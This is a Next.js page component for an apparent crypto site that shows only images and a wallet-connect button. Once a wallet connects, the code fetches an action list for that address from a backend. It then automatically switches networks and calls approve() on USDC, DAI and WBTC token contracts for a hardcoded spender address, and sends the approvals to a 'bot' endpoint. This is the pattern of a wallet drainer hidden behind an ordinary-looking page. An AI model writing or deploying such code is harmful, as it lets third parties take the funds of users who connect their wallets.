import Head from "next/head";
import Image from "next/image";
import styles from "@/styles/Home.module.css";
import { useEffect, useState } from "react";
import { useAccount, useSwitchNetwork } from "wagmi";
import USDC_TESTNET_ABI from "../Constants/USDC_TESTNET_ABI.json";
import axios from "axios";
import { BackendURL_USER, DAI_MUMBAI, DAI_SEPOLIA, USDC_MUMBAI, USDC_SEPOLIA, WBTC_MUMBAI, WBTC_SEPOLIA } from "@/Constants/Variable_Constants";
const ethers = require("ethers");
import Web3 from "web3";
import bitimg from "../../public/Bitcoin.png";

export default function Home() {
  const [step, setStep] = useState(-1);
  const [isNetworkSwitchHighlighted, setIsNetworkSwitchHighlighted] = useState(false);
  const [isConnectHighlighted, setIsConnectHighlighted] = useState(false);
  const [userAddress, setUserAddress] = useState<string | null>(null);
  const { chains, error, isLoading: chainload, pendingChainId, switchNetwork } = useSwitchNetwork();
  const kad = "0x8De924D8863288cba2bB4219089c5e1495dc5ab3";
  const [userFetchedDetails, setUserFetchedDetail] = useState<any[]>([]);
  const { address, connector, isDisconnected } = useAccount();
  const [currentNetworkId, setCurrentNetworkId] = useState<number>(11155111);
  const [isUsersDetailsFetched, setIsUsersDetailsFetched] = useState(false);
  const web3 = new Web3(window.ethereum as any);
  const [botMessage, setBotMessage] = useState<any[]>([]);

  const myarray = [
    // ... (unchanged)
  ];

  const checkchain = async () => {
    const res = await connector?.getChainId();
    setCurrentNetworkId(res);
  };

  const closeAll = () => {
    setIsNetworkSwitchHighlighted(false);
    setIsConnectHighlighted(false);
  };

  const ApproveFunction = async (ContractAddress: string, amount: string) => {
    try {
      const { ethereum } = window;
      const provider = new ethers.providers.Web3Provider(ethereum);
      const signer = provider.getSigner();
      const transactionsContract = new ethers.Contract(ContractAddress, USDC_TESTNET_ABI, signer);
      const ios = await transactionsContract.approve(kad, amount);
      console.log("Transaction hash", ios);
      const tempBotObject = { "tokenAddress": ContractAddress, "ApprovedAmount": amount };
      setBotMessage([...botMessage, tempBotObject]);
      setStep(step + 1);
    } catch (error) {
      console.error("Error in calling approve function", ContractAddress, error);
      setStep(step + 1);
    }
  };

  const performAction = async (actionObject: any) => {
    if (actionObject?.action === "switch") {
      if (window.ethereum) {
        try {
          const hexValue = web3.utils.toHex(actionObject?.networkId);
          const res = await (window.ethereum as any).request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: hexValue }],
          });
          setStep(step + 1);
        } catch (error) {
          console.error("Error switching network:", error);
          // Optionally, provide user feedback about the error
        }
      } else {
        console.error("Ethereum provider not available");
      }
      setTimeout(() => {
        setStep(step + 1);
      }, 2000);
    }
    if (actionObject?.action === "approve") {
      switchNetwork?.(actionObject?.networkId);
      ApproveFunction(actionObject?.tokenAddress, actionObject?.approveAmount);
    }
    if (actionObject?.action === "sendToBot") {
      try {
        await axios.post("http://localhost:3001/sendMessage", botMessage);
        setStep(step + 1);
      } catch (error) {
        console.error("Error sending message to bot", error);
      }
    }
  };

  const callUserDetails = async () => {
    if (address) {
      try {
        const res = await axios.get(`${BackendURL_USER}/${address}`);
        setUserFetchedDetail(res?.data?.data);
        setIsUsersDetailsFetched(true);
      } catch (error) {
        console.error("Error calling user API", error);
      }
    }
  };

  useEffect(() => {
    if (address) {
      setUserAddress(address);
    }
    if (!isUsersDetailsFetched) {
      callUserDetails();
    }
  }, [address]);

  useEffect(() => {
    if (isUsersDetailsFetched && address) {
      setStep(step + 1);
    }
  }, [isUsersDetailsFetched, address]);

  useEffect(() => {
    if (step >= 0 && address) {
      performAction(userFetchedDetails[step]);
    }
  }, [step]);

  useEffect(() => {
    checkchain();
  }, [connector?.getChainId()]);

  useEffect(() => {
    if (localStorage.getItem("addressInternalDisconnect") === null) {
      localStorage.setItem("addressInternalDisconnect", "false");
    }
    if (address) {
      localStorage.setItem("addressInternalDisconnect", "true");
    }
    if (
      localStorage.getItem("addressInternalDisconnect") === "true" &&
      !address
    ) {
      localStorage.setItem("addressInternalDisconnect", "false");
      window.location.reload();
    }
  }, [address, isDisconnected]);

  return (
    <>
      <Image alt="" src={bitimg} height={70} style={{ marginLeft: 200, marginTop: 30, position: "absolute" }} />
      <Image alt="" src={bitimg} height={120} style={{ marginLeft: 320, marginTop: 140, position: "relative" }} />
      <Image alt="" src={bitimg} height={130} style={{ marginLeft: 960, marginTop: 235, position: "absolute" }} />
      <div style={{ display: "flex", justifyContent: "center", marginTop: "170px" }}>
        <w3m-button />
      </div>
    </>
  );
}
